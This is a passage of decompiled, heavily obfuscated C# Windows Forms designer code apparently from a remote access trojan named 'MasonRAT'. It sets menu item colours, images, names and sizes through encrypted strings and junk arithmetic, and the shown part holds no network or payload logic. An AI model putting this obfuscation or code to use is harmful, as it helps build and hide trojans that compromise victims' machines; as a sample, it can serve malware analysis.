    this.\u2694️MasonRAT\u270Cڠـڙـۙ\u060Eـۙﮪم\u0020\u0608ﻋ\u0608\u060Aٸٻ.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 188));
    this.\u2694️MasonRAT\u270Cڠـڙـۙ\u060Eـۙﮪم\u0020\u0608ﻋ\u0608\u060Aٸٻ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 189);
    this.\u2694️MasonRAT\u270Cڠـڙـۙ\u060Eـۙﮪم\u0020\u0608ﻋ\u0608\u060Aٸٻ.Size = new Size((1551230212 % 1162404962 - 388825031 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0 ^ 2031026152 - (1477377488 | 956746496) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0, 28);
    this.\u2694️MasonRAT\u270Cڠـڙـۙ\u060Eـۙﮪم\u0020\u0608ﻋ\u0608\u060Aٸٻ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 190);
    this.\u2694️MasonRAT\u270Cـڙ\u060Aڇـب\u060Bــٽء.BackColor = Color.FromArgb(1540411790 + ~1475007909 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 - (1957115430 - 340656114 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0) % (1764564174 + -213508711 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1), (~687085742 - 2063033588 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) + ~((-1304355061 ^ ~296379062) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1), ((2016273063 > 1345333156 ? 2085187098 : -1514717832) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0 > (932789010 > 525920950 ? 1268699400 : 1691599200) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 ? (60 ^ 22) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0 : (53 ^ 13) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0);
    this.\u2694️MasonRAT\u270Cـڙ\u060Aڇـب\u060Bــٽء.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cـڙ\u060Aڇـب\u060Bــٽء.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 191));
    this.\u2694️MasonRAT\u270Cـڙ\u060Aڇـب\u060Bــٽء.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 192 /*0xC0*/);
    this.\u2694️MasonRAT\u270Cـڙ\u060Aڇـب\u060Bــٽء.Size = new Size((984640404 - (144080976 >> 1284758442) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) + ~((1171042046 ^ (107094666 | 2069940684)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0), 28);
    this.\u2694️MasonRAT\u270Cـڙ\u060Aڇـب\u060Bــٽء.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 193);
    this.\u2694️MasonRAT\u270Cژﻼ\u060D\u060D\u060E\u0608ٽــ\u060B.BackColor = Color.FromArgb((92378796 | 1887099824) - 412806951 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0 - (1566634106 + (886332168 >> 1231417790) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1), (415491566 + ~415491548 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 ^ (2 ^ 9) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1), ((-2068625744 ^ (1995571463 | 1881074863)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0 ^ -((381363403 ^ 1701011758 << 1942100203) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1));
    this.\u2694️MasonRAT\u270Cژﻼ\u060D\u060D\u060E\u0608ٽــ\u060B.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cژﻼ\u060D\u060D\u060E\u0608ٽــ\u060B.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 194));
    this.\u2694️MasonRAT\u270Cژﻼ\u060D\u060D\u060E\u0608ٽــ\u060B.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 195);
    this.\u2694️MasonRAT\u270Cژﻼ\u060D\u060D\u060E\u0608ٽــ\u060B.Size = new Size((~771830826 - 1645464403 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0) - (123255836 + (1709545109 | 1112243469) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0 | 2049113868 - 406358373 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1), 28);
    this.\u2694️MasonRAT\u270Cژﻼ\u060D\u060D\u060E\u0608ٽــ\u060B.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 196);
    this.\u2694️MasonRAT\u270Cـ̍ح\u060Eـ\u060Dـ\u060Aڞ\u060Eٻڇـ\u0020\u060B̨\u0608̍ٺ.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cـ̍ح\u060Eـ\u060Dـ\u060Aڞ\u060Eٻڇـ\u0020\u060B̨\u0608̍ٺ.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 197));
    this.\u2694️MasonRAT\u270Cـ̍ح\u060Eـ\u060Dـ\u060Aڞ\u060Eٻڇـ\u0020\u060B̨\u0608̍ٺ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 198);
    this.\u2694️MasonRAT\u270Cـ̍ح\u060Eـ\u060Dـ\u060Aڞ\u060Eٻڇـ\u0020\u060B̨\u0608̍ٺ.Size = new Size(((-832246436 ^ 522992107 >> 317590172) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) - ~((832246640 ^ 22) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0), 28);
    this.\u2694️MasonRAT\u270Cـ̍ح\u060Eـ\u060Dـ\u060Aڞ\u060Eٻڇـ\u0020\u060B̨\u0608̍ٺ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 199);
    this.\u2694️MasonRAT\u270Cۨـ\u060Aــٺگــ\u060A\u0608ـ\u060Fڛﻼ.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cۨـ\u060Aــٺگــ\u060A\u0608ـ\u060Fڛﻼ.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 200));
    this.\u2694️MasonRAT\u270Cۨـ\u060Aــٺگــ\u060A\u0608ـ\u060Fڛﻼ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 201);
    this.\u2694️MasonRAT\u270Cۨـ\u060Aــٺگــ\u060A\u0608ـ\u060Fڛﻼ.Size = new Size((441130002 + 1213970385 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) - (-1169529153 - 1470337952 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0, 28);
    this.\u2694️MasonRAT\u270Cۨـ\u060Aــٺگــ\u060A\u0608ـ\u060Fڛﻼ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 202);
    this.\u2694️MasonRAT\u270C\u060Fـ\u0608د\u060A\u060Aـ\u060A\u0608\u060Dـــڇۨﻋـ.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270C\u060Fـ\u0608د\u060A\u060Aـ\u060A\u0608\u060Dـــڇۨﻋـ.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 203));
    this.\u2694️MasonRAT\u270C\u060Fـ\u0608د\u060A\u060Aـ\u060A\u0608\u060Dـــڇۨﻋـ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 204);
    this.\u2694️MasonRAT\u270C\u060Fـ\u0608د\u060A\u060Aـ\u060A\u0608\u060Dـــڇۨﻋـ.Size = new Size(((217 ^ 15) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0 ^ 1440144620 - 1440144602 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 ^ 0, 28);
    this.\u2694️MasonRAT\u270C\u060Fـ\u0608د\u060A\u060Aـ\u060A\u0608\u060Dـــڇۨﻋـ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 205);
    this.\u2694️MasonRAT\u270Cـڙ\u060D\u060A\u0609\u0609ﻻټ\u060Aاٺڙـۧڼ.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cـڙ\u060D\u060A\u0609\u0609ﻻټ\u060Aاٺڙـۧڼ.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 206));
    this.\u2694️MasonRAT\u270Cـڙ\u060D\u060A\u0609\u0609ﻻټ\u060Aاٺڙـۧڼ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 207);
    this.\u2694️MasonRAT\u270Cـڙ\u060D\u060A\u0609\u0609ﻻټ\u060Aاٺڙـۧڼ.Size = new Size((732409850 + 1776620544 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) + (1672207490 + 113729608 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1), 28);
    this.\u2694️MasonRAT\u270Cـڙ\u060D\u060A\u0609\u0609ﻻټ\u060Aاٺڙـۧڼ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 208 /*0xD0*/);
    this.\u2694️MasonRAT\u270C\u060F\u060Dـڇْحـ\u060Bـ̍ٸ\u060C\u0020\u0608.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270C\u060F\u060Dـڇْحـ\u060Bـ̍ٸ\u060C\u0020\u0608.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 209));
    this.\u2694️MasonRAT\u270C\u060F\u060Dـڇْحـ\u060Bـ̍ٸ\u060C\u0020\u0608.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 210);
    this.\u2694️MasonRAT\u270C\u060F\u060Dـڇْحـ\u060Bـ̍ٸ\u060C\u0020\u0608.Size = new Size((1916622550 > 1622773792 ? 685403529 : 913871372) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 - (685404419 - (1139037982 >> 836177940) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1), 28);
    this.\u2694️MasonRAT\u270C\u060F\u060Dـڇْحـ\u060Bـ̍ٸ\u060C\u0020\u0608.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 211);
    this.\u2694️MasonRAT\u270Cڅ\u0608ۡـۧۡ\u060Eـ\u0608ئ\u0608\u060Aدﻋ\u060Bڙ.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cڅ\u0608ۡـۧۡ\u060Eـ\u0608ئ\u0608\u060Aدﻋ\u060Bڙ.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 212));
    this.\u2694️MasonRAT\u270Cڅ\u0608ۡـۧۡ\u060Eـ\u0608ئ\u0608\u060Aدﻋ\u060Bڙ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 213);
